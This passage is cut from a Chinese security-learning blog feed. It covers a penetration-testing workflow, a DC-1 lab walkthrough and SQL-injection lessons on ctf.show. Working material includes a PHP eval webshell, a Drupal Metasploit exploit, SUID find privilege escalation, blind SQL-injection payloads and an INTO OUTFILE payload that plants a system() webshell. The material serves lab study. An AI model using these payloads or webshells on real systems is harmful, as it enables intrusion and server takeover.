src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703925750021-f3a095fa-4c26-43ce-8601-8f5903ac4d8f.png" alt="image.png"><br>在虚拟机上面运行这两个语句，发现是同时输出的。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704110343340-685c365d-7cee-4c41-a30f-bbf85b63f474.png" alt="image.png"><br>输入select 1,(select group_concat(1,2,3)),3;<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704110479674-ab1e75ee-f3a1-4336-bbe7-c5f25ad881b0.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> sql注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 过滤,宽字节 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透整体流程</title>
      <link href="/2024/01/01/%E6%B8%97%E9%80%8F%E6%95%B4%E4%BD%93%E6%B5%81%E7%A8%8B/"/>
      <url>/2024/01/01/%E6%B8%97%E9%80%8F%E6%95%B4%E4%BD%93%E6%B5%81%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="一-基本流程："><a href="#一-基本流程：" class="headerlink" title="一.基本流程："></a>一.基本流程：</h1><p>渗透整体分为三部分：<br>前渗透也被称为外网打点，权限维持以及后渗透，权限维持也可划分到前渗透中。<br>权限维持也包括提权，主机信息收集<br>web打点，apk打点(安卓手机打点)，钓鱼等等最终目的都是为了获得权限。<br>结构示意图：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704104112606-080c1da6-7a4d-4b8c-bd49-dd99662745ae.png" alt="image.png"></p><h1 id="二-web打点"><a href="#二-web打点" class="headerlink" title="二.web打点"></a>二.web打点</h1><p>信息收集分情况进行处理：已知ip，已知域名，已知邮箱。</p><h2 id="2-1已知ip"><a href="#2-1已知ip" class="headerlink" title="2.1已知ip"></a>2.1已知ip</h2><h3 id="2-1-1基于主机"><a href="#2-1-1基于主机" class="headerlink" title="2.1.1基于主机"></a>2.1.1基于主机</h3><p>可以进行端口扫描，从而确定端口对应的服务，一共有65536(0~65535)个端口。浏览器也是如此，在浏览器上每开启一个页面都要在本地建立端口于远端服务器进行连接。<br>在web服务(浏览器)上就可以进行目录扫描，通过目录扫描发现信息泄露，如果没有进行校验还会发生越权或者目录穿越。web服务上面还会发现ssh，ftp，smb，RDP，寻找API(可能存在is之中)，根据ico图标找相关站点等服务，其中的密码都可以进行爆破。简单的用户名和密码，组织统一注册的用户名和密码，历史密码拼接容易被爆破。还可以进行强制爆破。以上种种情况基于主机。</p><h3 id="2-1-2反查"><a href="#2-1-2反查" class="headerlink" title="2.1.2反查"></a>2.1.2反查</h3><p>根据ip地址反查域名<br>通过微步在线进行反查<br>通过在微步进行服务器ip地址的查询可以看到绑定的图标以及ip解析的域名，相关网站，网页的js以及ip开饭的端口等信息均可以查到。<br>根据图标也可能会被查到相关信息。<br><a href="https://x.threatbook.com/v5/circleIntroduction">微步在线X情报社区-威胁情报查询_威胁分析平台_开放社区</a></p><h3 id="2-1-3ip定位"><a href="#2-1-3ip定位" class="headerlink" title="2.1.3ip定位"></a>2.1.3ip定位</h3><h2 id="2-2已知域名"><a href="#2-2已知域名" class="headerlink" title="2.2已知域名"></a>2.2已知域名</h2><h3 id="2-2-1域名："><a href="#2-2-1域名：" class="headerlink" title="2.2.1域名："></a>2.2.1域名：</h3><p>举个简单的例子：<a href="http://www.baidu.com就是域名/">www.baidu.com就是域名</a><br>域名（Domain Name）是用于在互联网上标识和定位网站或互联网资源的人类可读的地址。它是将IP地址（用于在网络上唯一标识设备）转化为易于记忆的字符序列的方式。<br>域名的结构通常由多个部分组成，以点（.）作为分隔符。最顶层的部分被称为顶级域名（Top-Level Domain，简称TLD），如.com、.org、.net等。顶级域名可以按照国家&#x2F;地区（如.cn表示中国）、通用（如.com表示商业）、组织类型（如.edu表示教育机构）等进行分类。<br>在顶级域名下面，可以添加二级域名和更多级别的子域名。<br>域名的作用是方便用户记忆和使用，它提供了一个更友好和可读性更高的方式来访问网站和互联网资源，而不是依赖于记忆一长串数字的IP地址。当用户在浏览器中输入域名时，系统将通过域名解析将其转换为相应的IP地址，以便正确访问目标资源。</p><h3 id="2-2-2域名备案"><a href="#2-2-2域名备案" class="headerlink" title="2.2.2域名备案"></a>2.2.2域名备案</h3><p><a href="https://beian.miit.gov.cn/">https://beian.miit.gov.cn/</a>通过这个地址查看域名备案<br><a href="https://beian.miit.gov.cn/#/Integrated/index">https://beian.miit.gov.cn/#/Integrated/index</a><br>通过域名备案可以查到邮箱，姓名，主体，服务备案号，通过备案号可以查其他相关网站。<br>通过备案号加上引号进行百度搜索</p><h2 id="2-3已知邮箱"><a href="#2-3已知邮箱" class="headerlink" title="2.3已知邮箱"></a>2.3已知邮箱</h2><p><a href="https://www.reg007.com/">https://www.reg007.com/</a>通过这个网站搜索邮箱，手机号可以看到注册过的一些相关网页或者应用，不过比较鸡肋的是必须证明是本人进行查询，还需要发送验证码。<br><a href="https://www.reg007.com/">你注册过哪些网站？一搜便知 - REG007</a><br>已知邮箱可以查询到姓名，手机号，历史密码，身份证，户口本，淘宝记录。<br>整体流程图：<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40666686/1704105640013-89d83557-1bc1-4759-ab54-a2b3a8818ff7.png#clientId=uf7a01aae-8f00-4&from=paste&height=360&id=u73593838&originHeight=1314&originWidth=1288&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=112840&status=done&style=none&taskId=uf861a87b-261c-4980-8334-09fb9cbc345&title=&width=352.8182067871094" alt="web打点.png"></p><p><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/web%E6%89%93%E7%82%B9.png" alt="web打点"></p><p><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704631084543-8584c6bc-ff32-46ee-8ad3-3aa3ae1ee909.png" alt="1b6c5c46f1cdaf6434b3475876c4404.png"></p>]]></content>
      
      
      <categories>
          
          <category> 信息收集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透整体流程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC靶机流程</title>
      <link href="/2024/01/01/DC%E9%9D%B6%E6%9C%BA%E6%B5%81%E7%A8%8B/"/>
      <url>/2024/01/01/DC%E9%9D%B6%E6%9C%BA%E6%B5%81%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="一-准备工作："><a href="#一-准备工作：" class="headerlink" title="一.准备工作："></a>一.准备工作：</h1><p>1.准备好DC1靶机和kali linux虚拟机两台设备。<br>2.由于一开始不知道DC1靶机的ip地址，可以将两台设备调整为nat模式，对DC1进行查看物理地址并记录下来</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">DC1的mac地址：<span class="number">00</span>:<span class="number">0</span>C:<span class="number">29</span>:<span class="number">0</span>D:<span class="number">49</span>:<span class="number">7</span>C</span><br></pre></td></tr></table></figure><p>3.kali linux虚拟机通过ifconfig找到当前的ip地址</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">etho：<span class="number">192.168</span>.<span class="number">17.132</span></span><br></pre></td></tr></table></figure><p>4.通过nmap端口扫描找到DC1的IP地址：namp -sn 192.168.17.132&#x2F;24<br> “其中-sn”参数指定了 nmap 工具执行 “Ping Scan”，即使用 ICMP 回应来确定目标主机是否存活。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">命令：namp -sn <span class="number">192.168</span>.<span class="number">17.132</span>/<span class="number">24</span></span><br><span class="line">得出DC1的IP：<span class="number">192.168</span>.<span class="number">17.133</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704091615731-24f43c74-c974-45e3-802e-a510ce7e8cf2.png" alt="image.png"></p><h1 id="二-获取信息："><a href="#二-获取信息：" class="headerlink" title="二.获取信息："></a>二.获取信息：</h1><p>1.通过此命令查看DC1的基本信息：nmap  -sS 192.168.17.133 -A<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704092567178-54de0a76-63b1-44cb-881b-570720c25d74.png" alt="image.png"><br>2.通过此命令查看DC1的全端口信息：nmap  -p- 192.168.17.133<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704092890218-39a06a68-9eb7-4744-bedb-80a6a5a7afbb.png" alt="image.png"><br>3.确定版本：nmap -p 80 -sV 192.168.17.133,由于自己试过无法主机无法到达，因为两个虚拟机都选择的是nat模式所以无法互相拼通。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704094358883-fbdc679d-d33d-41d9-ae85-dd9ae4e5701d.png" alt="image.png"><br>再在kali机上面打开浏览器搜索192.168.17.133:80,关键字是:Drupal Site ,用sql注入进行尝试发现没啥用处，邮箱注册发送也没用<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704094392970-8a2f5cd7-0d79-46f5-9240-fd5b523c67ba.png" alt="image.png"><br>4.进行目录扫描：<br>dirsearch -u 192.168.17.133 -x 403，404 -t 50<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704096389841-ac8a1e9b-072f-46cc-992a-ddafb4cd2c22.png" alt="image.png"><br>在网页后面加上&#x2F;robots.txt。这个文件是一个爬虫文件。<br>robots.txt 是一个用于指导网络爬虫的文件。它是位于网站根目录下的一个文本文件，用于向搜索引擎和其他网络爬虫提供关于网站爬取规则的指示。<br>当搜索引擎的爬虫访问一个网站时，它会首先查找并读取 robots.txt 文件。该文件中包含了一些指令，告诉爬虫哪些网页可以被爬取，哪些不可以。通过 robots.txt，网站管理员可以控制搜索引擎爬虫在访问网站时的行为，例如禁止爬虫访问某些特定的页面、目录或文件。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704096070188-0a24b7ba-1294-4cdf-b5c1-9d865689d136.png" alt="image.png"><br>再去看一下&#x2F;UPGRADE.txt可以发现Drupal是一个框架，当前版本是7.0，百度搜索一下，发现版本比较老，可能存在漏洞。</p><h1 id="三-msf尝试进行攻击："><a href="#三-msf尝试进行攻击：" class="headerlink" title="三.msf尝试进行攻击："></a>三.msf尝试进行攻击：</h1><p>启动msf:msfconsole<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704097120601-d2cc9855-7416-4f9e-8f1e-efaeaf41708f.png" alt="image.png"><br>搜索框架漏洞：search drupal<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704097235060-b53250b7-22e8-41ab-92f8-888304e867d6.png" alt="image.png"><br>发现存在这些漏洞，一个个进行尝试，最后发现第二个能够成功。<br>尝试用use 0会话没有创建成功，用use 2成功创建会话。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704097625687-a4dd0a8f-65f5-45b7-a4bf-608ef5e3cbd8.png" alt="image.png"><br>show options查看必须要设置的选项<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704097681635-0fe434fc-e915-475e-85a7-402942ec824b.png" alt="image.png"><br>set rhosts <strong>192.168.17.133#这个ip是DC1的ip</strong><br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704097841942-f3bafd92-e046-4117-b3c1-53a674e19447.png" alt="image.png"><br>run一下出现这个说明伪终端创建成功。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704098022861-603ca049-568b-4d66-98ab-6687d5252cad.png" alt="image.png"></p><h1 id="四-尝试提权："><a href="#四-尝试提权：" class="headerlink" title="四.尝试提权："></a>四.尝试提权：</h1><p>shell一下，ls查看一下：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704098161189-d1c2a46f-ee02-4254-b0ab-5ee51f642b65.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704098208918-dddb4c1f-0bae-43f5-9395-73222fb9262c.png" alt="image.png"><br>pwd当前位置，whoami我是谁<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704098359199-0c718927-46e0-4977-a2b2-52ea54c02da9.png" alt="image.png"><br>cat flag1.txt<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704099049092-539eb57c-1e57-4dc8-83f7-f5285a88cfda.png" alt="image.png"></p><h2 id="CMS是什么？"><a href="#CMS是什么？" class="headerlink" title="CMS是什么？"></a>CMS是什么？</h2><p>CMS 是内容管理系统（Content Management System）的缩写。它是一种用于创建、编辑、管理和发布内容的软件系统或工具。<br>一个 CMS 提供了一系列的功能和工具，使用户可以轻松地创建、组织和发布内容，无需编写代码或进行复杂的技术操作。它通常包括用户管理、内容编辑、模板设计、发布管理等功能。<br>使用 CMS，用户可以创建和管理各种类型的网站，例如博客、新闻门户、企业网站、电子商务网站等。CMS 提供了易于使用的界面和工具，允许用户通过简单的操作来添加、编辑或删除页面内容、图像、视频、文章等，而无需涉及复杂的编程和设计知识。<br>一些常见的 CMS 包括 WordPress、Drupal、Joomla 等，它们都是广泛用于构建和管理网站的流行软件系统。通过使用 CMS，用户能够方便地管理网站的内容，使网站的维护和更新更加高效和简单。</p><h2 id="上传文件："><a href="#上传文件：" class="headerlink" title="上传文件："></a>上传文件：</h2><p>where curl #curl类似于一个命令行工具或者库<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704099285441-aefcacab-3400-4c6d-a02f-f91321f66138.png" alt="image.png"><br>输入curl出现帮助手册说明存在。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704099382857-a087ef21-36cc-451a-bd90-c19d11e38908.png" alt="image.png"><br>curl <a href="http://www.baidu.com/">www.baidu.com</a><br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704099478702-f1bc2532-f915-498b-befc-0852c39a96b2.png" alt="image.png"><br>在桌面新建一个1.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[cmd]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704099768665-38421335-8090-4172-a06f-99ad968ad8c0.png" alt="image.png"><br>重新开一个cmd窗口输入python -m http.server 80#意思是说将当前目录设置为网站根目录。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704100698868-cb6e5f0f-9c78-49a2-8afd-13bb4adabce0.png" alt="image.png"><br><a href="http://192.168.17.132/">http://192.168.17.132</a>  -o 1.php<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704100876363-b625babc-13a8-4ad1-ac86-19c5ebf2d5ca.png" alt="image.png"><br>ls发现上传成功。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704100921325-dbbf9a27-02c4-4540-8588-7a274308e7a7.png" alt="image.png"><br>cat 1.php<br>出现其他的内容说明上传的方式错了，上传了个下载连接地址。<br>正确的方式是这样的：<br>curl <a href="http://192.168.17.132/1.php">http://192.168.17.132/1.php</a> -o 2.php<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704101099861-4ba79589-8d60-4084-8a0f-f93a33300d1d.png" alt="image.png"><br>cat 2.php<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704101442272-d3c78ef4-de18-4d1c-80cb-57f900b9e568.png" alt="image.png"><br>成功之后调用系统命令执行函数。<br>192.168.17.133&#x2F;2.php?cmd&#x3D;sytem(ls);<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704101508378-94efa053-014e-43bf-8545-f649153039e3.png" alt="image.png"><br>通过木马获取权限，这是一种办法。</p><h1 id="五-短暂获取权限："><a href="#五-短暂获取权限：" class="headerlink" title="五.短暂获取权限："></a>五.短暂获取权限：</h1><p>python加强一下shell权限：python -c “import pty;pty.spawn(‘&#x2F;bin&#x2F;bash’)”#使用交互shell</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704102099589-99c9586a-cf89-4c12-a6e5-be70a7281f24.png" alt="image.png"><br>find提权：find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null#这里利用SUID进行提权，查看SUID的二进制可执行文件。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">find / -user root -perm -<span class="number">4000</span> -<span class="keyword">print</span> <span class="number">2</span>&gt;/dev/<span class="literal">null</span></span><br></pre></td></tr></table></figure><p>解释：<br>find 是一个命令，用于在文件系统中搜索文件或目录。<br>&#x2F; 是搜索的起始点，表示从根目录开始搜索。<br>-user root 是一个选项，表示搜索属主为 root 的文件或目录。<br>-perm -4000 是另一个选项，表示搜索权限设置为 4000（八进制表示）的文件或目录。其中的 - 表示匹配减去指定权限后的结果，4000 则对应 SUID 权限位。<br>-print 是一个选项，表示找到匹配的文件或目录时打印出它们的路径。<br>最后的 2&gt;&#x2F;dev&#x2F;null 是将搜索过程中产生的错误信息（标准错误输出）重定向到 &#x2F;dev&#x2F;null 设备中，以避免显示错误信息。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704102314135-8d6ce1e0-5b70-46f2-b26d-c1fe9ef1fffd.png" alt="image.png"><br>find &#x2F; -name cron.php -exec “&#x2F;bin&#x2F;sh” ; #利用find获取root权限<br>id查看当前的用户。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704103236731-3f110ef3-b580-42e4-851d-330f2d65b1d1.png" alt="image.png"><br>cd &#x2F;root切换到root根目录<br>ls   发现最终的flag<br>cat theflnalfalg.txt 查看文件内容<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704103344531-6a88df95-4dbd-4155-9fe9-c635e20d6078.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> 靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DC靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>布尔盲注实例讲解,时间盲注,控制网站,sqlmap工具的使用。</title>
      <link href="/2024/01/01/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E5%AE%9E%E4%BE%8B%E8%AE%B2%E8%A7%A3-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8-%E6%8E%A7%E5%88%B6%E7%BD%91%E7%AB%99-sqlmap%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8%E3%80%82/"/>
      <url>/2024/01/01/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E5%AE%9E%E4%BE%8B%E8%AE%B2%E8%A7%A3-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8-%E6%8E%A7%E5%88%B6%E7%BD%91%E7%AB%99-sqlmap%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8%E3%80%82/</url>
      
        <content type="html"><![CDATA[<h2 id="一、布尔盲注实例："><a href="#一、布尔盲注实例：" class="headerlink" title="一、布尔盲注实例："></a>一、布尔盲注实例：</h2><p>首先映入眼帘的是ctf_show第四关。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703336220310-3b06d9b1-f7d9-45cf-ad4d-2fb84b70ff8c.png" alt="image.png"><br>按下F12，获得一个get请求的api，打开postman。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703336527700-822decb6-3af5-45dd-83a7-500fe0365ecc.png" alt="image.png"><br>能够得到对应的json，说明是一个api。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703336628436-88ce6077-76d9-4f82-9d57-961d52f85995.png" alt="image.png"><br>这里id&#x3D;1’and 1&#x3D;2– -正常回显结果为空，id&#x3D;1’and 1&#x3D;1– -正常回显显示id&#x3D;1的结果。闭合之后再去进行测试，否则就会报错。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703336779190-dd2add20-fded-4eba-a29c-713b0487b5d6.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703336956891-e3a23c56-b453-49aa-9e42-996761ce33b2.png" alt="image.png"><br>查询数据库开头第一个字母是不是r。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703337091145-af09b1bf-9ae4-493b-9c01-57adf7aa16d1.png" alt="image.png"><br>这里直接用大于，小于进行判断第一个首字母。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703337171574-3d6cb69a-a4ab-47d4-aa8e-f3547d33ceb7.png" alt="image.png"><br>直接换成昨天写好的布尔盲注的脚本，url换成该题目的api。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703337382530-be78a147-5d62-48be-a0cb-ccbd2cd10e4b.png" alt="image.png"><br>因为输入id&#x3D;1结果会出现admin，在if这里可以输入admin。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703337442770-1dde82ed-40c6-44ae-9677-2d8ce28663ef.png" alt="image.png"><br>输出结果正常<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703337567904-eba06dea-13a2-489e-9a61-e1749d43c882.png" alt="image.png"><br>之后就去各个去爆就好了，爆表，爆字段这些：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703337803267-9b63546b-3658-48aa-9189-de4fa15c67e0.png" alt="image.png"><br>flag结果展示：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703338043250-a585c80f-9ef0-4f5d-b165-c6f8edee5062.png" alt="image.png"><br>运行与调试<br>可以查看到每一步代码的运行过程。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703338331066-1cf077e6-d634-4d18-9d68-0cb9891fb38e.png" alt="image.png"></p><h2 id="二、时间盲注-睡眠盲注-："><a href="#二、时间盲注-睡眠盲注-：" class="headerlink" title="二、时间盲注(睡眠盲注)："></a>二、时间盲注(睡眠盲注)：</h2><p>发现不管输入什么都是直接显示。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703339284198-ed4ba48a-3d65-4cbe-b0cc-392fe6b84ccb.png" alt="image.png"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">id=<span class="number">1</span><span class="string">&#x27;and If(ascii(substr(database(),1,1))=115,1,sleep(5))-- -#三元运算，第一个表示条件，第二个1表示成功的时候，sleep(5)表示失败就休息</span></span><br><span class="line"><span class="string">SELECT BENCHMARK(1000000, SHA1(&#x27;</span>Hello World<span class="string">&#x27;));</span></span><br><span class="line"><span class="string">id=1&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">If</span>(<span class="title function_ invoke__">ascii</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">database</span>(),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">114</span>,<span class="number">1</span>,<span class="title function_ invoke__">BENCHMARK</span>(<span class="number">5000000</span>, <span class="title function_ invoke__">SHA1</span>(<span class="string">&#x27;Hello World&#x27;</span>)))-- -</span><br></pre></td></tr></table></figure><p>可以看到当&#x3D;115时马上就显示<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703340391273-4889aeb1-96ad-4d10-9579-56a30ca842e4.png" alt="image.png"><br>可以看到当&#x3D;114时一直处于加载状态，之后才出现结果。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703340416426-3ea97461-54a6-4dad-82e8-d0a528eab24d.png" alt="image.png"></p><p>if(查询语句,1,sleep(5))<br>，即如果我们的查询语句为真，那么直接返回结果；如果我们的查询语句为假，那么过5秒之后返回页面。所以我们就根据返回页面的时间长短来判断我们的查询语句是否执行正确。<br>if(expr1,expr2,expr3) :判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句<br>sleep(n) ：将程序挂起一段时间 n单位为秒</p><p>直接用时间盲注的脚本。<br><a href="https://www.yuque.com/attachments/yuque/0/2023/py/40666686/1703340795579-30954cd2-23f9-4ad7-9ee5-b0955881ea07.py?_lake_card=%7B%22src%22:%22https://www.yuque.com/attachments/yuque/0/2023/py/40666686/1703340795579-30954cd2-23f9-4ad7-9ee5-b0955881ea07.py%22,%22name%22:%22%E6%97%B6%E5%BB%B6%E7%9B%B2%E6%B3%A81.py%22,%22size%22:2046,%22ext%22:%22py%22,%22source%22:%22%22,%22status%22:%22done%22,%22download%22:true,%22taskId%22:%22u208a619b-6db5-499f-8692-33414b57f10%22,%22taskType%22:%22upload%22,%22type%22:%22text/x-python%22,%22__spacing%22:%22both%22,%22mode%22:%22title%22,%22id%22:%22ua29a5379%22,%22margin%22:%7B%22top%22:true,%22bottom%22:true%7D,%22card%22:%22file%22%7D">时延盲注1.py</a><br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703340700798-738fe349-b140-4e16-9e99-2117bbd7f5e8.png" alt="image.png"></p><h2 id="三、控制网站："><a href="#三、控制网站：" class="headerlink" title="三、控制网站："></a>三、控制网站：</h2><p>?id&#x3D;-1’ union select 1,@@datadir,3– -显示phpstudy的网站根目录。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703341500246-d1f888c3-d9b8-4a76-a49c-8aaea7c9629b.png" alt="image.png"><br>secure_file_priv&#x3D;””将这段代码放入my.ini的文本中。这个文本的位置在phpstudy的设置中，点击配置文件，mysql.ini。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703341693015-72840272-40f7-411c-abc7-5b0f52356f5f.png" alt="image.png"><br>之后输入这段代码：<br>?id&#x3D;-1’ union select 1,@@datadir,@@secure_file_priv – -，password这里显示为空说明可以注入，在没有这个secure_file_priv&#x3D;””时password显示的是NULL。NULL代表不能在任何地方注入文件。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703341872977-3d8d342a-bbf5-45a7-88e8-75fc610e8aae.png" alt="image.png"><br>?id&#x3D;-1’ union select 1,@@datadir,”<?php ,phpinfo()  ?>“ into outfile “C:\phpstudy_pro\WWW\phpinfo.php” – -<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703343490023-5a004dbb-1deb-4a6f-8bae-3be68f12774a.png" alt="image.png"><br>此时发现在www的根目录下自动产生了phpinfo.php。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703342429374-71359c2d-3daf-45e6-b70a-dcc96aff40e3.png" alt="image.png"><br>?id&#x3D;-1’ union select 1,@@datadir,”<?php @system($_GET[a]);  ?>“ into outfile “C:\phpstudy_pro\WWW\tfk.php” – -#在windows中用&#x2F;&#x2F;表示&#x2F;。第一个&#x2F;表示转义符，两个&#x2F;才能表示本身的含义。system表示系统命令执行函数，这个函数通过get参数进行执行，创造了一个webshell后台。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703342328099-4e9cee26-7456-432c-9893-cfb08f1cc290.png"><br>打开网站输入?a&#x3D;dir<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703343632508-e42536c9-b428-4a38-8f7d-85936e9eefbf.png" alt="image.png"><br>打开网站输入?a&#x3D;whoami<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703343789595-202e1326-e6fd-48e4-b0fb-3ba356e65b71.png" alt="image.png"><br>打开网站输入?a&#x3D;systeminfo输出系统的基本信息<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703343915907-1d88aa82-691c-4cb1-b29e-86221a30ffcd.png" alt="image.png"></p><p>注意：<br>对文件进行导入导出首先得要有足够的权限，<br>但是mysql默认不能导入和导出文件，这与secure_file_priv的值有关（默认为null)<br>secure-file-priv参数是用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()传到哪个指定目录的。<br>1、当secure_file_priv的值为null ，表示限制mysqld 不允许导入|导出<br>2、当secure_file_priv的值为&#x2F;tmp&#x2F; ，表示限制mysqld 的导入|导出只能发生在&#x2F;tmp&#x2F;目录下<br>3、当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制<br>用以下命令查看secure_file_priv的值</p><h2 id="四、sqlmap的使用："><a href="#四、sqlmap的使用：" class="headerlink" title="四、sqlmap的使用："></a>四、sqlmap的使用：</h2><p>直接将老师发的连接放到浏览器，在科学上网的前提下，下载sqlmap。<br><a href="https://github.com/sqlmapproject/sqlmap/archive/refs/tags/1.7.zip">https://github.com/sqlmapproject/sqlmap/archive/refs/tags/1.7.zip</a><br><a href="https://www.yuque.com/attachments/yuque/0/2023/zip/40666686/1703344892779-093df318-4f37-4497-90fd-73433b8ba7ae.zip?_lake_card=%7B%22src%22:%22https://www.yuque.com/attachments/yuque/0/2023/zip/40666686/1703344892779-093df318-4f37-4497-90fd-73433b8ba7ae.zip%22,%22name%22:%22sqlmap-1.7.zip%22,%22size%22:7517702,%22ext%22:%22zip%22,%22source%22:%22%22,%22status%22:%22done%22,%22download%22:true,%22taskId%22:%22u5be8fca2-0099-4d38-9882-a420e1becf0%22,%22taskType%22:%22upload%22,%22type%22:%22application/x-zip-compressed%22,%22__spacing%22:%22both%22,%22mode%22:%22title%22,%22id%22:%22ua0c4413f%22,%22margin%22:%7B%22top%22:true,%22bottom%22:true%7D,%22card%22:%22file%22%7D">sqlmap-1.7.zip</a><br>解压并找到根目录，用cmd打开。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703344939595-d68ef219-96d6-49de-88fc-bb56afaa380c.png" alt="image.png"><br>查看帮助命令:python sqlmap.py -h<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703345092471-aa61c319-7cc1-490e-a595-06a58abe1767.png" alt="image.png"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">用法：python3 sqlmap [选项]</span><br><span class="line"></span><br><span class="line">选项：</span><br><span class="line">  -h, --help            显示基本帮助信息并退出</span><br><span class="line">  -hh                   显示高级帮助信息并退出</span><br><span class="line">  --version             显示程序版本号并退出</span><br><span class="line">  -v VERBOSE            详细程度级别：<span class="number">0</span>-<span class="number">6</span>（默认为<span class="number">1</span>）</span><br><span 